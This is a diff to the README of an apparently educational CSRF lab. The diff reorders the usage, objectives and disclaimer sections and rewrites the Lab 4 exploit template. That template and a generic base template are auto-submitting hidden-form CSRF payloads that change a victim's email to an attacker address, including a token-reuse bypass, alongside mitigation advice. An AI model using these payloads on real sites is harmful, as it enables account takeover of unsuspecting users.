@@ -147,72 +147,6 @@ DB_CHARSET=utf8mb4
 
 ---
 
-## 🚀 How to Use
-
-### Step 1 — Login
-Navigate to the lab and sign in using the credentials above.
-
-### Step 2 — Read the Objective
-Each lab displays:
-- The vulnerable feature being targeted
-- Your goal as the attacker
-- Optional hints to guide your approach
-
-### Step 3 — Craft Your Exploit
-Build a CSRF payload tailored to the lab's vulnerability. A typical base payload looks like:
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>CSRF PoC</title>
-</head>
-<body>
-  <form id="csrfForm"
-        action="http://TARGET/vulnerable-endpoint"
-        method="POST"
-        style="display:none;">
-    <input type="hidden" name="param" value="malicious-value">
-  </form>
-  <script>
-    document.getElementById('csrfForm').submit();
-  </script>
-</body>
-</html>
-```
-
-> Each lab has a different target endpoint and parameters — adapt accordingly.
-
-### Step 4 — Reveal the Solution
-Stuck? Hit the **💡 Solution** button inside the lab to reveal the full working exploit and a detailed explanation of why the vulnerability exists and how the attack works.
-
----
-
-## 🎯 Learning Objectives
-
-After completing all labs, you will be able to:
-
-- ✅ Explain what CSRF is and how it differs from XSS or SQLi
-- ✅ Identify CSRF vulnerabilities in real PHP MVC applications
-- ✅ Craft working exploits for various CSRF scenarios
-- ✅ Bypass common (and flawed) CSRF protection implementations
-- ✅ Understand and apply proper mitigations: tokens, `SameSite` cookies, `Origin` validation
-
----
-
-## ⚠️ Disclaimer
-
-> This project is intended **strictly for educational purposes**.
->
-> All testing must be performed **only within this sandbox environment**.
->
-> Performing CSRF attacks against real systems **without explicit written permission is illegal** and unethical.
->
-> The author assumes **no responsibility** for any misuse of the content in this repository.
-
----
-
 ### 🔬 Lab 4
 
 <div align="center">
@@ -263,30 +197,32 @@ Change the **victim's email address** by forging a request that includes:
 #### 🧪 Exploit Template
 
 ```html
+<!--
+    CSRF Lab Demonstration
+    Create a legitimate email change request and intercept it.
+    Convert the request into a CSRF proof-of-concept using the lab tooling.
+    The CSRF token used in this request must be fresh and unused.
+    Since tokens are single-use, a previously consumed token will fail validation.
+-->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>CSRF PoC — Lab 4</title>
+    <meta charset="UTF-8">
+    <title>CSRF Exploit PoC</title>
 </head>
 <body>
-  <form id="csrfForm"
-        action="http://TARGET/change-email"
-        method="POST"
-        style="display:none;">
-    <input type="hidden" name="email" value="attacker@evil.com">
-    <!-- Token stolen from attacker's own valid session -->
-    <input type="hidden" name="csrf_token" value="VALID_TOKEN_FROM_ATTACKER_SESSION">
-  </form>
-  <script>
-    document.getElementById('csrfForm').submit();
-  </script>
+    <form id="csrfForm" action="http://localhost/update-email" method="POST">
+        <input type="hidden" name="csrf" value="TOKEN_ATTACKER">
+        <input type="hidden" name="email" value="attacker@lab.com" />
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
 </body>
 </html>
 ```
 
-> Replace `VALID_TOKEN_FROM_ATTACKER_SESSION` with a real token extracted from the attacker account's session.
-
+> Replace the `TOKEN_ATTACKER` value with the attacker's value.
 ---
 
 #### 🛡️ How to Fix This Vulnerability
@@ -318,6 +254,77 @@ Additional hardening:
 - Validate the `Origin` or `Referer` header as a secondary check
 
 ---
+
+---
+
+## 🚀 How to Use
+
+### Step 1 — Login
+Navigate to the lab and sign in using the credentials above.
+
+### Step 2 — Read the Objective
+Each lab displays:
+- The vulnerable feature being targeted
+- Your goal as the attacker
+- Optional hints to guide your approach
+
+### Step 3 — Craft Your Exploit
+Build a CSRF payload tailored to the lab's vulnerability. A typical base payload looks like:
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF PoC</title>
+</head>
+<body>
+  <form id="csrfForm"
+        action="http://TARGET/vulnerable-endpoint"
+        method="POST"
+        style="display:none;">
+    <input type="hidden" name="param" value="malicious-value">
+  </form>
+  <script>
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
+```
+
+> Each lab has a different target endpoint and parameters — adapt accordingly.
+
+---
+
+### Step 4 — Reveal the Solution
+Stuck? Hit the **💡 Solution** button inside the lab to reveal the full working exploit and a detailed explanation of why the vulnerability exists and how the attack works.
+
+---
+
+## 🎯 Learning Objectives
+
+After completing all labs, you will be able to:
+
+- ✅ Explain what CSRF is and how it differs from XSS or SQLi
+- ✅ Identify CSRF vulnerabilities in real PHP MVC applications
+- ✅ Craft working exploits for various CSRF scenarios
+- ✅ Bypass common (and flawed) CSRF protection implementations
+- ✅ Understand and apply proper mitigations: tokens, `SameSite` cookies, `Origin` validation
+
+---
+
+## ⚠️ Disclaimer
+
+> This project is intended **strictly for educational purposes**.
+>
+> All testing must be performed **only within this sandbox environment**.
+>
+> Performing CSRF attacks against real systems **without explicit written permission is illegal** and unethical.
+>
+> The author assumes **no responsibility** for any misuse of the content in this repository.
+
+---
+
 ## 👤 Author
 
 <div align="center">
